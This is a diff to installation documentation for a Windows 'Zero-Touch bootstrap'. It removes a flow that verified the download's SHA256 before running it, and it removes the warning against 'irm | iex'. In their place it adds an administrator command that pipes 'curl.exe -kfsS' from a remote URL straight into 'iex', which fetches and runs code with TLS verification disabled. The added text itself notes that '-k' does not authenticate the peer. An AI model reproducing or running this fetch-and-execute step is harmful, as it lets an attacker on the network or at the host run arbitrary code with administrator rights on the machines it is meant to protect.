@@ -15,24 +15,13 @@ The Windows path under qualification includes installation/enrollment, SYSTEM Sc
 
 ## Zero-Touch bootstrap
 
-After the admin issues a Windows bootstrap command, keep the production trust flow as:
-
-```text
-download
--> SHA256 verify
--> powershell.exe -File
-```
-
-Do **not** replace this with `irm ... | iex`.
-
-Example after downloading `install-client.ps1` and verifying its SHA256 against the release `SHA256SUMS`:
+The fixed target for administrator PowerShell is:
 
 ```powershell
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\install-client.ps1 -ZeroTouch `
-  -AllocatorUrl https://YOUR_HOST/enroll `
-  -CaSha256 <DER_SHA256> `
-  -BootstrapTicket 'bt1.<id>.<secret>'
+iex(curl.exe -kfsS https://remote.xdr.ooo/A3xK9mP2|Out-String)
 ```
+
+The Server selects the OS-specific entry file. No client-side DataRelay prerequisite or inline enrollment configuration. Public/private HTTPS share the target. Downstream integrity and automatic first-claim enrollment are mandatory; `-k` does not authenticate the initial peer. Native Windows and security qualification remain pending. See [canonical contract](../docs/ZERO_TOUCH_REGRESSION_CONTROL.md).
 
 ## Lifecycle
 
